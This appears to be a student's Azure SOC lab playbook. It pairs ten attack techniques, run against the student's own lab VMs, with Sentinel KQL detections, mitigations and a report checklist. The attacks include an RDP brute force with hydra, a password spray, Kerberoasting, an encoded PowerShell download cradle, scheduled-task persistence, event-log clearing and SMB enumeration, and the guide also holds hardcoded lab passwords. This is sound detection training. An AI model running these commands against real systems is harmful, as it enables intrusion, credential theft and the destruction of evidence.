# AzureSOC — Attack & Defense Playbook
## Complete Guide: Attacks, Detection, Documentation, and Learning

---

# PART 1: YOUR LAB LAYOUT AND WHERE TO FIND THINGS

## Azure Portal Locations (Bookmark These)

### Sentinel (Your SIEM — where you detect attacks)
- **URL:** portal.azure.com > Search "Microsoft Sentinel" > law-azuresoc
- **Logs:** Sentinel > General > Logs (write KQL queries here)
- **Incidents:** Sentinel > Threat management > Incidents (auto-created alerts)
- **Workbooks:** Sentinel > Threat management > Workbooks (dashboards)
- **Analytics:** Sentinel > Configuration > Analytics (create detection rules)
- **Hunting:** Sentinel > Threat management > Hunting (proactive threat search)
- **MITRE ATT&CK:** Sentinel > Threat management > MITRE ATT&CK (coverage map)
- **Automation:** Sentinel > Configuration > Automation (SOAR playbooks)
- **Data Connectors:** Sentinel > Configuration > Data connectors (what feeds data in)
- **SCREENSHOT:** Take SS of each of these pages for your report

### Your VMs
- **All Resources:** portal.azure.com > All Resources (shows everything in your account)
- **VM Overview:** Click any VM > Overview (status, IP, size, OS)
- **VM Networking:** Click VM > Networking (see NSG rules applied to it)
- **VM Run Command:** Click VM > Operations > Run command (execute scripts remotely)
- **SCREENSHOT:** Take SS of VM overview showing both VMs

### Network Security
- **NSGs:** portal.azure.com > Search "Network security groups" > click any NSG
- **NSG Rules:** Click NSG > Settings > Inbound/Outbound security rules
- **VNet:** Search "Virtual networks" > vnet-azuresoc > Subnets (see all subnets)
- **SCREENSHOT:** Take SS of NSG rules for nsg-dc and nsg-honeypot

### Key Vault
- **URL:** portal.azure.com > Search "Key vaults" > kv-u6icclo4gpyl6
- **Secrets:** Key Vault > Objects > Secrets (where API keys go)
- **Access Policies:** Key Vault > Access configuration
- **SCREENSHOT:** Take SS of Key Vault overview

---

# PART 2: SETTING UP YOUR ATTACK MACHINE

## Option A: Use Your Existing Linux VM as Attack + Target (FREE, No Extra VM)

Your vm-splunk already has Ubuntu. Install attack tools on it:

```powershell
# Run from your local terminal - installs attack tools on the Linux VM
az vm run-command invoke -g rg-azuresoc --name vm-splunk --command-id RunShellScript --scripts "apt-get update -qq; apt-get install -y nmap nikto hydra john hashcat curl wget netcat-openbsd dirb gobuster sqlmap enum4linux smbclient 2>/dev/null; echo 'ATTACK TOOLS INSTALLED'; which nmap nikto hydra john"
```

## Option B: Free Cloud Kali (if you get quota increase to 6+ cores)

Request quota first: Portal > Search "Quotas" > Compute > Total Regional vCPUs > Request 6 for centralus.

Then deploy Kali:
```powershell
# Only after quota increase is approved
az vm create -g rg-azuresoc --name vm-kali --image kali-linux:kali:kali-2024-3:latest --size Standard_D2s_v3 --admin-username kali --admin-password "Kali@SOC2026!" --vnet-name vnet-azuresoc --subnet snet-honeypot --public-ip-address pip-kali
```

## Option C: Use Your Local Machine + SSH Tunnel (FREE, works now)

Install these on your Windows PC:
- Nmap: https://nmap.org/download.html
- Or use WSL: `wsl --install` then `sudo apt install nmap nikto hydra`

---

# PART 3: HONEYPOT SETUP (Free, on your existing Linux VM)

You don't need a new VM. Install T-Pot (open source honeypot) on your Linux VM:

```powershell
# This installs Cowrie SSH honeypot on your Linux VM
az vm run-command invoke -g rg-azuresoc --name vm-splunk --command-id RunShellScript --scripts "apt-get install -y python3-pip python3-venv git; cd /opt; git clone https://github.com/cowrie/cowrie.git 2>/dev/null; cd cowrie; python3 -m venv cowrie-env; source cowrie-env/bin/activate; pip install -r requirements.txt 2>/dev/null; cp etc/cowrie.cfg.dist etc/cowrie.cfg; bin/cowrie start; echo 'COWRIE HONEYPOT STARTED on port 2222'"
```

Or even simpler — make Apache look like a vulnerable app:

```powershell
# Create a fake login page that logs all attempts
az vm run-command invoke -g rg-azuresoc --name vm-splunk --command-id RunShellScript --scripts "cat > /var/www/html/index.html << 'EOF'
<html><head><title>Company Intranet - Login</title></head>
<body style='font-family:Arial;max-width:400px;margin:100px auto;'>
<h2>AZURESOC Corp - Employee Portal</h2>
<form method='POST' action='/login.php'>
<input type='text' name='user' placeholder='Username' style='width:100%;padding:8px;margin:5px 0;'><br>
<input type='password' name='pass' placeholder='Password' style='width:100%;padding:8px;margin:5px 0;'><br>
<button style='width:100%;padding:10px;background:#0078D4;color:white;border:none;cursor:pointer;'>Sign In</button>
</form><p style='color:gray;font-size:12px;'>Authorized access only. All attempts are logged.</p>
</body></html>
EOF
systemctl restart apache2; echo 'FAKE LOGIN PAGE DEPLOYED at http://20.9.19.213'"
```

**SCREENSHOT:** Open http://20.9.19.213 to see the fake login page

---

# PART 4: ALL ATTACKS YOU CAN RUN (with detection + mitigation)

## IMPORTANT: Start your VMs first!
```powershell
cd C:\Projects\files
.\scripts\setup\start-all.ps1
# Wait 3-5 min for VMs to boot
```

---

## ATTACK 1: Network Reconnaissance with Nmap (T1046)

**What it is:** Attacker scans the network to discover open ports and services.
**Why it matters:** This is always the FIRST thing an attacker does.

**How to attack (from your Linux VM targeting the DC):**
```powershell
az vm run-command invoke -g rg-azuresoc --name vm-splunk --command-id RunShellScript --scripts "nmap -sV -sC -O 10.0.1.4 2>&1; echo '---'; nmap -sV 10.0.1.4 -p 1-1000 2>&1"
```

**What to look for in Sentinel:**
```kql
// Check for port scan activity
AzureNetworkAnalytics_CL
| where TimeGenerated > ago(1h)
| where FlowDirection_s == "I"
| summarize PortsScanned = dcount(DestPort_d) by SrcIP_s
| where PortsScanned > 20
```

**Mitigation:** NSG rules limiting inbound ports. Only open what's needed.
**SCREENSHOT:** Take SS of nmap output + Sentinel query results

---

## ATTACK 2: Brute Force RDP (T1110.001)

**What it is:** Attacker tries many passwords to guess RDP login.
**Why it matters:** RDP brute force is the #1 attack on cloud VMs.

**How to attack (from Linux VM):**
```powershell
az vm run-command invoke -g rg-azuresoc --name vm-splunk --command-id RunShellScript --scripts "apt-get install -y hydra 2>/dev/null; echo 'admin\nazuresocadmin\nadministrator\njsmith\nsconnor\nadmin.backup' > /tmp/users.txt; echo 'password\nPassword1\nP@ssw0rd\nWinter2026\nadmin123\nletmein' > /tmp/passwords.txt; hydra -L /tmp/users.txt -P /tmp/passwords.txt 10.0.1.4 rdp -t 4 -V 2>&1 | tail -30"
```

**What to look for in Sentinel:**
```kql
// Failed RDP logons (Event ID 4625)
SecurityEvent
| where EventID == 4625
| where LogonType == 10
| summarize FailedAttempts = count() by IpAddress, TargetAccount
| sort by FailedAttempts desc
```

**Where in Portal:** Sentinel > Logs > paste the KQL above > Run
**Mitigation:** Account lockout policy, MFA, NSG to restrict RDP source IPs
**SCREENSHOT:** Take SS of hydra output + Sentinel showing 4625 events

---

## ATTACK 3: Account Enumeration (T1087.001 + T1087.002)

**What it is:** Attacker discovers all user accounts in the domain.
**Why it matters:** Knowing usernames is the first step to password attacks.

**How to attack (RDP into DC, run in PowerShell):**
```powershell
# Domain user enumeration
net user /domain
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain
net localgroup Administrators

# PowerShell enumeration
Get-ADUser -Filter * -Properties MemberOf | Select Name, SamAccountName, Enabled
Get-ADGroup -Filter * | Select Name, GroupScope
Get-ADComputer -Filter * | Select Name, DNSHostName

# Find service accounts (Kerberoasting targets)
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName | Select Name, ServicePrincipalName
```

**What to look for in Sentinel:**
```kql
SecurityEvent
| where EventID == 4688
| where CommandLine has_any ("net user", "net group", "Get-ADUser", "Get-ADGroup", "whoami")
| project TimeGenerated, Account, CommandLine, Computer
| sort by TimeGenerated desc
```

**Mitigation:** Least privilege, remove unnecessary group memberships, monitor for enumeration
**SCREENSHOT:** Take SS of each command output + Sentinel detection

---

## ATTACK 4: Kerberoasting (T1558.003)

**What it is:** Request Kerberos tickets for service accounts, crack them offline.
**Why it matters:** Gets passwords without touching LSASS or triggering most defenses.

**How to attack (on DC via RDP):**
```powershell
# Request TGS ticket for the vulnerable service account
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dc01.azuresoc.local:1433"

# Alternative: using PowerShell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName | Select Name, ServicePrincipalName
```

**What to look for in Sentinel:**
```kql
// Kerberos TGS request with RC4 encryption (weak = likely attack)
SecurityEvent
| where EventID == 4769
| where ServiceName !endswith "$"
| project TimeGenerated, Account, ServiceName, IpAddress, TicketEncryptionType
| sort by TimeGenerated desc
```

**Mitigation:** Use strong passwords on service accounts (25+ chars), use AES encryption, monitor 4769 events
**SCREENSHOT:** Take SS of the Kerberos ticket output + Sentinel 4769 events

---

## ATTACK 5: Suspicious PowerShell / Encoded Commands (T1059.001)

**What it is:** Running obfuscated PowerShell commands to evade detection.
**Why it matters:** 90%+ of modern malware uses PowerShell.

**How to attack (on DC via RDP):**
```powershell
# Base64 encoded "whoami" command
powershell -EncodedCommand dwBoAG8AYQBtAGkA

# Download cradle (simulated - downloads harmless page)
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://10.0.2.4/')"

# Encoded reverse shell pattern (harmless simulation)
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("Write-Host 'SIMULATED ATTACK - Encoded Command Executed'"))
powershell -EncodedCommand $encoded
```

**What to look for in Sentinel:**
```kql
SecurityEvent
| where EventID == 4688
| where CommandLine has_any ("EncodedCommand", "FromBase64", "IEX", "DownloadString", "Invoke-Expression")
| project TimeGenerated, Account, CommandLine, ParentProcessName
| sort by TimeGenerated desc
```

**Mitigation:** Constrained Language Mode, Script Block Logging, AMSI, application whitelisting
**SCREENSHOT:** Take SS of encoded commands + Sentinel detections

---

## ATTACK 6: Scheduled Task Persistence (T1053.005)

**What it is:** Create scheduled tasks that survive reboot.
**Why it matters:** Persistence = attacker stays even after you patch the initial entry.

**How to attack (on DC via RDP):**
```powershell
# Create a persistent scheduled task (simulated C2 callback)
schtasks /create /tn "WindowsUpdateCheck" /tr "cmd.exe /c echo AttackerPayload > C:\Temp\beacon.txt" /sc hourly /st 00:00 /f

# Verify it exists
schtasks /query /tn "WindowsUpdateCheck"

# CLEANUP after documenting
schtasks /delete /tn "WindowsUpdateCheck" /f
```

**What to look for in Sentinel:**
```kql
SecurityEvent
| where EventID in (4698, 4699, 4700, 4701, 4702)
| project TimeGenerated, EventID, Activity, Account, Computer
| sort by TimeGenerated desc
// 4698 = task created, 4699 = deleted, 4700 = enabled, 4701 = disabled
```

**Mitigation:** Monitor scheduled task creation, limit who can create tasks, audit Task Scheduler
**SCREENSHOT:** Take SS of task creation + Sentinel 4698 event

---

## ATTACK 7: Event Log Clearing (T1070.001)

**What it is:** Attacker clears logs to cover their tracks.
**Why it matters:** This is a HUGE red flag — legitimate admins almost never clear logs.

**How to attack (on DC via RDP):**
```powershell
# Clear PowerShell log (generates Event ID 1102 in Security log)
wevtutil cl "Windows PowerShell"

# You can also clear System log
wevtutil cl "System"
```

**What to look for in Sentinel:**
```kql
SecurityEvent
| where EventID == 1102
| project TimeGenerated, Account, Computer, Activity
| sort by TimeGenerated desc
```

**Mitigation:** Forward logs to external SIEM (Sentinel!) so even if local logs are cleared, the copy exists
**SCREENSHOT:** Take SS of the clear command + Sentinel 1102 event. This is a GREAT screenshot — shows why external SIEM matters.

---

## ATTACK 8: Web Application Scanning (T1595.002)

**What it is:** Scanning a web server for vulnerabilities.
**Why it matters:** Web apps are the most common external attack surface.

**How to attack (from Linux VM targeting Apache):**
```powershell
az vm run-command invoke -g rg-azuresoc --name vm-splunk --command-id RunShellScript --scripts "nikto -h http://localhost -output /tmp/nikto-results.txt 2>&1 | head -40; echo '---DIRB---'; dirb http://localhost /usr/share/dirb/wordlists/common.txt 2>&1 | tail -20"
```

**What to look for:** Apache access logs (on the Linux VM) and Suricata alerts
```powershell
az vm run-command invoke -g rg-azuresoc --name vm-splunk --command-id RunShellScript --scripts "echo '=== APACHE LOGS ==='; tail -20 /var/log/apache2/access.log; echo '=== SURICATA ALERTS ==='; tail -20 /var/log/suricata/fast.log 2>/dev/null || echo 'No alerts yet'"
```

**Mitigation:** WAF, input validation, rate limiting, keep web server updated
**SCREENSHOT:** Take SS of nikto output + Apache logs showing the scan

---

## ATTACK 9: Password Spray (T1110.003)

**What it is:** Try ONE common password against MANY accounts.
**Why it matters:** Avoids account lockout (only 1 attempt per account).

**How to attack (on DC via RDP):**
```powershell
# Simulate password spray - try "Winter2026!" against all users
$users = @("jsmith","sconnor","mjones","edavis","jwilson","lbrown","admin.backup","svc.sql")
foreach ($u in $users) {
    $result = net use \\DC01\IPC$ /user:AZURESOC\$u "Winter2026!" 2>&1
    Write-Host "$u : $result"
    net use \\DC01\IPC$ /delete 2>&1 | Out-Null
}
```

**What to look for in Sentinel:**
```kql
SecurityEvent
| where EventID == 4625
| where TimeGenerated > ago(30m)
| summarize AttemptCount = count(), DistinctAccounts = dcount(TargetAccount) by IpAddress, bin(TimeGenerated, 5m)
| where DistinctAccounts > 3
```

**Mitigation:** Smart lockout, MFA, password policy requiring complex passwords
**SCREENSHOT:** Take SS of spray output + Sentinel showing multiple 4625s across accounts

---

## ATTACK 10: SMB Enumeration (T1135)

**What it is:** Discover shared folders and files on the network.
**Why it matters:** Shares often contain sensitive documents, credentials.

**How to attack (from Linux VM):**
```powershell
az vm run-command invoke -g rg-azuresoc --name vm-splunk --command-id RunShellScript --scripts "smbclient -L 10.0.1.4 -U 'azuresocadmin%AzureS0C@2026!' 2>&1; echo '---'; enum4linux -a 10.0.1.4 2>&1 | head -50"
```

**What to look for in Sentinel:**
```kql
SecurityEvent
| where EventID in (5140, 5145)  // Share accessed, detailed share access
| project TimeGenerated, Account, ShareName, IpAddress
| sort by TimeGenerated desc
```

**Mitigation:** Disable unnecessary shares, audit share access, use NTFS permissions
**SCREENSHOT:** Take SS of smbclient output + Sentinel share access events

---

# PART 5: WHERE TO TAKE SCREENSHOTS (Complete Report Checklist)

## Infrastructure Screenshots (take these first)
- [ ] Azure Portal > All Resources page (shows all 18 resources)
- [ ] VM Overview for vm-dc01 (shows Windows, IP, status)
- [ ] VM Overview for vm-splunk (shows Linux, IP, status)
- [ ] VNet > Subnets page (shows 3 subnets)
- [ ] NSG rules for nsg-dc (shows RDP + AD ports allowed)
- [ ] NSG rules for nsg-honeypot (shows allow-all rule)
- [ ] Key Vault overview page

## Sentinel Screenshots (take during/after attacks)
- [ ] Sentinel > Overview dashboard
- [ ] Sentinel > Data connectors (showing 8 connected)
- [ ] Sentinel > Logs > SecurityEvent query with results
- [ ] Sentinel > Logs > Each attack detection KQL query with results
- [ ] Sentinel > Incidents page (after creating analytics rules)
- [ ] Sentinel > MITRE ATT&CK coverage map (after creating rules)
- [ ] Sentinel > Workbooks (if you create dashboards)

## Active Directory Screenshots (RDP into DC)
- [ ] Server Manager dashboard showing AD DS role
- [ ] PowerShell: Get-ADUser -Filter * | Select Name
- [ ] PowerShell: Get-ADGroup -Filter * | Select Name
- [ ] PowerShell: Get-Service Sysmon64
- [ ] Event Viewer > Sysmon Operational log

## Attack Screenshots (most important for report!)
- [ ] Each attack command being run
- [ ] The output of each attack
- [ ] The Sentinel KQL query that detects it
- [ ] The Sentinel results showing the detection
- [ ] Side-by-side comparison: attack terminal + Sentinel detection

## Network Screenshots
- [ ] nmap scan results
- [ ] Apache default page (http://20.9.19.213)
- [ ] Honeypot fake login page (after deploying it)

---

# PART 6: REPORT STRUCTURE

Your report should follow this structure:

## 1. Executive Summary (1 page)
- What you built, why, and key findings

## 2. Architecture & Design (2-3 pages)
- Network diagram (use the one I made)
- Resource table (all 18 Azure resources)
- Design decisions and why

## 3. Deployment Process (2-3 pages)
- How the master-deploy script works
- Screenshots of deployment output
- Challenges faced and how you solved them

## 4. Attack & Detection Analysis (1 page per attack, 10 pages total)
Each attack page should have:
- Attack name + MITRE ATT&CK ID
- What the attack does (2-3 sentences)
- Screenshot of attack being executed
- Screenshot of Sentinel detecting it
- KQL detection query
- Mitigation / defense recommendation
- MITRE ATT&CK matrix reference

## 5. Lessons Learned (1-2 pages)
- What you learned about cloud security
- What you learned about SOC operations
- What you would do differently

## 6. Future Work (1 page)
- Honeypot deployment
- More VMs (workstation, attacker)
- SOAR automation
- Splunk integration
- Defender for Endpoint EDR

---

# PART 7: PORTAL EXPLORATION GUIDE

## Places to explore in Azure Portal:

### Microsoft Defender for Cloud
- Portal > Search "Microsoft Defender for Cloud"
- Check your "Secure Score" (how secure your setup is)
- Look at "Recommendations" (what Azure thinks you should fix)
- Look at "Regulatory Compliance" (CIS, NIST frameworks)
- SCREENSHOT: Secure Score page + top recommendations

### Azure Monitor
- Portal > Search "Monitor"
- Look at Metrics (CPU, memory, disk for your VMs)
- Look at Activity Log (who did what in your subscription)
- SCREENSHOT: Activity log showing your deployments

### Cost Management
- Portal > Search "Cost Management"
- Look at "Cost analysis" (see what's costing money)
- Look at "Budgets" (set spending alerts)
- SCREENSHOT: Cost breakdown by resource

### Azure Active Directory (Entra ID)
- Portal > Search "Entra ID" or "Azure Active Directory"
- Look at Users, Groups, Sign-in logs
- Look at Security > Identity Protection
- SCREENSHOT: Sign-in logs page

### Network Watcher
- Portal > Search "Network Watcher"
- Try "IP flow verify" (test if traffic is allowed)
- Try "NSG flow logs" (see network traffic)
- Try "Connection troubleshoot" (test connectivity between VMs)
- SCREENSHOT: IP flow verify results

---

# PART 8: MAKING IT FUN AND INTERESTING

## Challenge yourself:
1. Can you detect your own attack BEFORE looking at the answer?
2. Write the KQL query yourself before checking the one provided
3. Try to figure out the MITRE ATT&CK technique before I tell you
4. Think about: "If I were a real attacker, what would I do next?"
5. Think about: "If I were a SOC analyst, how would I investigate this?"

## Investigation exercise:
After running all attacks, go to Sentinel > Logs and try to reconstruct the ENTIRE attack chain using only logs:
```kql
SecurityEvent
| where TimeGenerated > ago(2h)
| where EventID in (4688, 4624, 4625, 4672, 4698, 4769, 1102)
| project TimeGenerated, EventID, Activity, Account, Computer, IpAddress, CommandLine
| sort by TimeGenerated asc
```

Can you tell the STORY of the attack just from the logs? That's what SOC analysts do every day.

---

# QUICK REFERENCE: Start your lab session

```powershell
# Start VMs
cd C:\Projects\files
.\scripts\setup\start-all.ps1

# Wait 3-5 min, then verify
.\scripts\setup\verify-all.ps1

# When done
.\scripts\setup\stop-all.ps1
```
